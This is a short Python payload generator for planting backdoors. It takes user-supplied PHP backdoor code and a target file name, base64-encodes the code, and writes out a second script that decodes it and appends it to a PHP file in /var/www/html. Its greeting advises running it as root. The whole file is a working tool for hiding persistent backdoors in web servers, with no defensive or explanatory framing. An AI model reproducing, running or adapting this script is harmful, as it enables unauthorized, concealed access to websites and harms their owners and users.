#!/bin/python3.9
import base64

greeting = '''\
Run this with root for the best results.
These payloads will plant a php one liner
on any file you wish. This is designed to target
the /var/www/html directory.
'''

print(greeting)
backdoor = input("\nEnter the php backdoor code: ")
target = input("Which php file are you targeting? ")

backdoor_bytes = backdoor.encode('utf-8')
backdoor_encoded = base64.b64encode(backdoor_bytes)

text = f'''\
#!/bin/python3.9
import base64

backdoor_encoded = {backdoor_encoded}
backdoor = base64.b64decode(backdoor_encoded)

with open("/var/www/html/{target}", "ab") as thefile:
    thefile.write(backdoor)

'''

filename = input("What would you like to save the file as? ")
with open(filename, "w") as thefile:
    thefile.write(text)
    print("Payload generated...")
    exit()
